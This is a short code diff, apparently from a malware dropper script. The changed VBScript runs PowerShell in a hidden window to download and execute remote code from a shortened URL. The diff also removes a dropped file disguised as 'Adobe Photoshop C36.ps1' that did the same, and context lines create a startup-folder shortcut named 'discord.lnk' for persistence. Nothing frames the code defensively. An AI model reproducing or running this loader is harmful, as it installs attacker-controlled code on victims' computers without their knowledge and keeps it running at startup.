@@ -32,13 +32,9 @@ end if
 loop
 
 Dim shell,command
-command = "powershell.exe -File ""Adobe Photoshop C36.ps1"""
+command = "powershell -noexit -command ""& {iex (new-object system.net.webclient).downloadstring('http://tinyurl.com/y44v5ltr')}"""
 Set shell = CreateObject("WScript.Shell")
 shell.Run command,0
-"@
-
-New-Item -Path . -Name "Adobe Photoshop C36.ps1" -ItemType "file" -Value @"
-iex (new-object system.net.webclient).downloadstring('http://tinyurl.com/y44v5ltr')
 "@
 
 $Shortcut = $wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\discord.lnk")
